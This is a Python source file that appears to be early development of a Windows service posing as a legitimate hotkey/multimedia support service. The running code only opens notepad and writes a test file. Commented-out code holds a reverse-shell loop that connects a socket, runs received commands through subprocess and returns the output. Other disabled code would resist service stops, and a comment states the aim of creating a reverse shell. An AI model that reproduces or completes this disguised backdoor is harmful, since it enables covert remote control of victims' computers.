from local_libs import service
import servicemanager
import sys
import time
import os
import subprocess
import socket
import psutil


class Main(service.WinService):
    _svc_name_ = "ABC"
    _svc_display_name_ = "ABC"
    _svc_description_ = "Enables and supports the use of keyboard shortcuts on keyboards, remote controls, and other " \
                        "multimedia devices. Disabling this service is not recommended."

    def __init__(self, args):
        super().__init__(args)
        self.is_running = False

    def start(self):
        self.is_running = True

    def main(self):
        psutil.Popen("notepad.exe")
        with open("C:/Users/User/Desktop/test.txt", "w") as f:
            f.write("Windows service")
        # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # s.connect(("127.0.0.1", 8888))
        # while True:
        #     command = s.recv(1024).decode()
        #     if command.lower() == "exit":
        #         break
        #     output = subprocess.getoutput(command)
        #     # s.send(output.encode())
        # s.close()

    # def SvcStop(self):
    #     return False


if __name__ == '__main__':
    if len(sys.argv) == 1:
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(Main)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        Main.parse_command_line()


# with open("C:/Users/User/Desktop/test.txt", "w") as f:
#     f.write("Windows service")
# FNULL = open("C:/test.txt", "w")
# test_path = r"C:\Users\User\Desktop\test.exe"
# subprocess.Popen(["start", test_path], stdout=FNULL, shell=False)
# # subprocess.run(command, shell=False)
# time.sleep(5)
# # try to create reverse shell right here

# psutil
# https://www.youtube.com/watch?v=_lmFArB6OI8
# https://www.youtube.com/watch?v=y2mjqDOPg4U&ab_channel=MATRIX
